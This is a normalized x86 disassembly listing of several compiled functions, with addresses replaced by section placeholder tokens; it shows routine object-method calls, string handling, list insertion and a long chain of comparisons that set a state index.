inc [ esi + 0x414 ]
dec eax
je r-xdata
mov edx [ eax ]
sub esp 0x44
push 0x11
pop ecx
add esi 0x3f4
mov edi esp
[ edi ] [ esi ]
mov ecx eax
call [ edx + 0x4 ]
inc [ esi + 0x41c ]
jmp r-xdata
dec eax
je r-xdata
inc [ esi + 0x40c ]
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax ]
mov eax [ esi + 0x368 ]
test eax eax
je r-xdata
inc [ esi + 0x424 ]
jmp r-xdata
dec eax
jne r-xdata
inc [ esi + 0x42c ]
jmp r-xdata
sub_40d0c2
mov eax [ esi + 0x160 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
pop ebx
retn
cmp [ eax + 0x8 ] 0x2
jne r-xdata
lea eax [ esi + 0x168 ]
cmp [ eax ] ebx
je r-xdata
lea eax [ esi + 0x164 ]
cmp [ eax ] ebx
je r-xdata
cmp [ esi + 0x234 ] bl
jne r-xdata
mov ecx [ esi + 0x160 ]
mov eax [ ecx ]
push edi
call [ eax + 0xc ]
cmp [ esi + 0x235 ] bl
je r-xdata
mov eax [ eax ]
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
jmp r-xdata
push edi
push 0x4000
push ebx
lea ebx [ esi + 0x384 ]
call sub_4149f1
sub_40d136
push 0xbc
mov eax sub_43ed33
call sub_425dad
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0xc8 ]
push eax
call sub_408d83
mov eax [ ebp + 0x8 ]
xor esi esi
add eax 0x43c
inc esi
mov [ ebp - 0x4 ] esi
inc [ eax ]
push [ eax ]
lea eax [ ebp - 0xc8 ]
push eax
call sub_408a3e
lea ecx [ ebp - 0x48 ]
lea eax [ ebp - 0xc8 ]
call sub_408e2c
mov edi eax
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
push edi
push eax
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0xc ]
call sub_40fa15
add esp 0xc
push 0x0
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] esi
call sub_40415f
push 0x0
push esi
lea ecx [ ebp - 0x48 ]
call sub_40415f
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x0
call sub_408986
mov eax [ ebp + 0xc ]
call sub_425e4c
retn 0x8
sub_40d1d8
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi + 0x14 ] esi
jne r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
xor al al
jmp r-xdata
push ebx
push eax
call sub_423a43
pop ecx
push esi
push r--data
push edi
mov [ ebp - 0x4 ] eax
call sub_403eca
mov ebx eax
cmp [ edi + 0x14 ] esi
je r-xdata
mov eax rw-data
pop edi
pop esi
leave
retn 0x4
xor eax eax
cmp [ ebp - 0x4 ] esi
pop ebx
setge al
cmp ebx esi
je r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
push esi
push edi
lea esi [ ebp - 0x20 ]
call sub_40ed02
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call sub_423a43
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
call sub_40415f
push 0xffffffff
push ebx
push edi
lea esi [ ebp - 0x20 ]
call sub_40ed02
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push eax
call sub_423a43
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x20 ]
call sub_40415f
mov esi [ ebp + 0x8 ]
sub_40d299
push 0x74
mov eax sub_43db85
call sub_425e16
and [ ebp - 0x40 ] 0x0
and [ ebp - 0x34 ] 0x0
mov ebx ecx
mov eax [ ebx ]
mov [ ebp - 0x48 ] ebx
call [ eax + 0x3c ]
mov ecx eax
mov eax [ ecx + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov eax [ ecx ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
call sub_423d5c
cmp [ ebp - 0x3c ] eax
je r-xdata
call sub_425e60
retn
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x38 ] esi
je r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x3
jmp r-xdata
xor bl bl
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
or [ ebp - 0x40 ] 0x1
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x64 ]
push edx
call [ eax + 0x44 ]
test al al
je r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x4
jmp r-xdata
test bl bl
je r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_40415f
mov bl 0x1
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x5
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_408d54
mov ebx [ ebp - 0x48 ]
mov ecx [ ebp - 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x3b0 ] eax
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x40 ] 0x1
je r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x6
jmp r-xdata
cmp [ ebp - 0x3c ] 0x0
mov esi [ ecx + 0x14 ]
mov eax [ ecx ]
je r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x7
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x8
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x9
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xa
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xb
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xc
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xd
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xe
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0xf
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x10
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
mov esi r--data
push esi
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x11
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] 0x12
call sub_403dc1
lea ecx [ ebp - 0x30 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x2c ]
push 0xffffffff
push esi
push eax
lea ecx [ edi + 0x3d4 ]
call sub_40400a
push esi
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x13
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x14
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x15
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x16
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x17
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x34 ] 0x18
jmp r-xdata
lea esi [ ebp - 0x3c ]
call sub_40f2a9
mov eax [ eax ]
mov [ edi + 0x3f0 ] eax
push r--data
lea ecx [ ebp - 0x80 ]
call sub_403dc1
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x80 ]
push edx
lea edx [ ebp - 0x30 ]
push edx
call [ eax + 0x40 ]
push 0x0
push ebx
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x4
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x2c ]
mov esi eax
lea eax [ ebp - 0x64 ]
push eax
lea ebx [ edi + 0x3b4 ]
call sub_404aa3
push 0xffffffff
push 0x0
push esi
mov ecx eax
call sub_40400a
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_40415f
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x2c ]
mov esi eax
lea eax [ ebp - 0x30 ]
push eax
lea ebx [ edi + 0x3b4 ]
call sub_404aa3
push 0xffffffff
push 0x0
push esi
mov ecx eax
call sub_40400a
jmp r-xdata
push 0x0
sub_40d87c
push 0x48
mov eax sub_43b0d8
call sub_425dad
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_425e4c
retn 0x4
mov esi [ edi + 0x2f0 ]
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ edi + 0x2f4 ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x2f4 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_40d8fc
test esi esi
je r-xdata
retn 0x8
cmp [ eax + 0x14 ] 0x0
je r-xdata
push eax
mov eax [ esp + 0x8 ]
add eax 0x284
push eax
call sub_40ef88
mov ecx [ esp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
sub_40d922
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
mov ebx eax
mov eax [ ebx + 0x29c ]
mov eax [ eax ]
add ebx 0x284
mov [ esp + 0xc ] eax
mov eax [ ebx ]
push esi
push edi
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] eax
call sub_4132aa
lea esi [ esp + 0x18 ]
call sub_40f2d4
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x1c ]
jne r-xdata
mov eax [ ebx + 0x18 ]
mov [ esp + 0x24 ] eax
mov eax [ ebx ]
lea edi [ esp + 0x20 ]
lea esi [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
call sub_40f543
test al al
jne r-xdata
push [ esp + 0x1c ]
lea eax [ esp + 0x2c ]
push edi
push eax
push ebx
call sub_412e71
jmp r-xdata
sub_40d9dd
push 0x48
mov eax sub_43b0d8
call sub_425dad
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_425e4c
retn 0x4
mov esi [ edi + 0x2b8 ]
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ edi + 0x2bc ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x2bc ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_40da5d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
xor edx edx
push esi
push edi
cmp [ ebp + 0x8 ] edx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx eax
mov esi [ ebx + 0x2b8 ]
add ebx 0x2a4
mov eax [ ebx ]
mov ecx [ ebx ]
mov [ esp + 0x18 ] eax
mov eax esi
mov eax [ eax ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
cmp ecx edx
je r-xdata
mov edx [ edx ]
mov edi eax
mov edx [ ecx ]
cmp ecx edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ edi + 0x8 ] eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov eax [ esp + 0x10 ]
mov esi [ ebx + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx ]
mov [ esp + 0x1c ] edi
je r-xdata
call sub_423d5c
mov edi [ edi ]
jmp r-xdata
call sub_423d5c
cmp [ esp + 0x10 ] eax
je r-xdata
cmp edi esi
je r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp edi esi
je r-xdata
push edi
push [ esp + 0x14 ]
lea eax [ esp + 0x20 ]
push eax
call sub_40f0ab
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40db0d
push 0x48
mov eax sub_43b0d8
call sub_425dad
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_425e4c
retn 0x4
mov esi [ edi + 0x328 ]
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ edi + 0x32c ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x32c ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_40db8d
push 0x48
mov eax sub_43b0d8
call sub_425dad
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_425e4c
retn 0x4
mov esi [ edi + 0x25c ]
lea eax [ ebp + 0x8 ]
push eax
push [ esi + 0x4 ]
push esi
call sub_42030b
mov ecx [ edi + 0x260 ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x260 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_40dc0d
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
pop edi
pop esi
leave
retn
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x4 ]
call sub_408d54
jmp r-xdata
mov eax [ ebx + 0x25c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x248 ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40dc61
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x10
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ esp + 0x8 ] ecx
mov [ esp + 0xc ] eax
mov edi ebx
call sub_40ae7e
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
call sub_408d54
jmp r-xdata
mov eax [ ebx + 0x25c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x248 ]
lea edi [ esp + 0x10 ]
lea esi [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40dccc
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
mov esi [ ebx + 0x25c ]
mov eax [ ebx + 0x248 ]
je r-xdata
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
test al al
je r-xdata
call sub_423d5c
cmp [ ebp - 0xc ] eax
je r-xdata
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x8 ] esi
pop edi
sete al
mov [ ebx + 0x434 ] al
pop esi
leave
retn 0x4
mov eax [ ebx + 0x25c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x248 ]
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40dd51
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
pop edi
pop esi
leave
retn 0x4
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0xc ]
call sub_408d54
jmp r-xdata
mov eax [ ebx + 0x25c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x248 ]
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40ddaa
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
pop edi
pop esi
leave
retn 0x4
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
call sub_408d54
jmp r-xdata
mov eax [ ebx + 0x25c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x248 ]
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40de03
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebx + 0x25c ]
mov eax [ eax ]
mov ecx [ ebx + 0x248 ]
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
pop edi
pop esi
leave
retn 0x4
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
call sub_408d54
jmp r-xdata
mov eax [ ebx + 0x25c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x248 ]
lea edi [ ebp - 0x14 ]
lea esi [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call sub_41ea56
test al al
je r-xdata
sub_40de5c
push ebp
mov ebp esp
sub esp 0x24
mov eax [ edi + 0x30c ]
mov eax [ eax ]
mov ecx [ edi + 0x2f8 ]
push ebx
push esi
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
call sub_423d5c
cmp ebx eax
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
call sub_408d54
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ecx ]
mov [ ebp - 0x18 ] ebx
call [ eax + 0x6c ]
lea esi [ ebp - 0x18 ]
mov ebx eax
call sub_40f2a9
mov eax [ eax ]
lea ecx [ ebx + 0x70 ]
add eax 0x70
call sub_40561a
test al al
je r-xdata
cmp [ ebp - 0xc ] esi
je r-xdata
pop esi
pop ebx
leave
retn 0x4
mov eax [ edi + 0x2f0 ]
mov eax [ eax ]
mov ecx [ edi + 0x2dc ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x10 ]
mov esi [ edi + 0x30c ]
mov eax [ edi + 0x2f8 ]
test ebx ebx
je r-xdata
call sub_40f2a9
cmp [ eax + 0x4 ] 0x0
je r-xdata
call sub_423d5c
cmp [ ebp - 0x10 ] eax
je r-xdata
call sub_40f2a9
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
call sub_408d54
jmp r-xdata
cmp [ ebp - 0xc ] esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov esi [ edi + 0x2f0 ]
mov eax [ edi + 0x2dc ]
je r-xdata
sub_40df54
push ebp
mov ebp esp
sub esp 0x10
mov eax [ edi + 0x328 ]
mov eax [ eax ]
mov ecx [ edi + 0x314 ]
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
call sub_423d5c
cmp [ ebp - 0xc ] eax
je r-xdata
pop esi
leave
retn 0x4
lea esi [ ebp - 0xc ]
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov esi [ edi + 0x328 ]
mov eax [ edi + 0x314 ]
je r-xdata
sub_40dfb0
push 0xf4
mov eax sub_43c1d1
call sub_425dad
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x27c ]
mov eax [ eax ]
mov ecx [ ebx + 0x264 ]
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x74 ]
lea edi [ ebx + 0x284 ]
push eax
lea ebx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] edi
call sub_40f491
mov eax [ edi + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ edi ]
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebp - 0x2c ] eax
call sub_40f543
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x90 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov edi [ eax ]
add edi 0x58
call sub_40f2d4
mov ecx [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x90 ]
push eax
call [ edi ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x12 ] al
call sub_40415f
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ eax ]
mov [ ebp - 0x3c ] ecx
lea ecx [ ebp - 0x3c ]
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x18 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
lea esi [ ebp - 0x20 ]
call sub_41bfbb
jmp r-xdata
call sub_40f2d4
mov eax [ eax + 0x1c ]
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov ebx [ ebp + 0xc ]
call sub_40f2d4
mov eax [ eax + 0x1c ]
mov edi [ eax ]
mov [ ebp - 0x1c ] eax
add edi 0x8
call sub_40f2d4
push [ eax + 0x20 ]
mov ebx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
push ebx
call [ edi ]
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx ebx
jmp r-xdata
mov eax [ ebx + 0x27c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebx + 0x264 ]
lea edi [ ebp - 0x34 ]
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x34 ] eax
call sub_40f543
test al al
jne r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_425e4c
retn 0x8
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x60 ]
xor esi esi
inc esi
cmp eax esi
jne r-xdata
mov eax [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x24 ]
call sub_412e71
jmp r-xdata
mov [ ebp - 0x11 ] 0x1
mov edx [ ecx ]
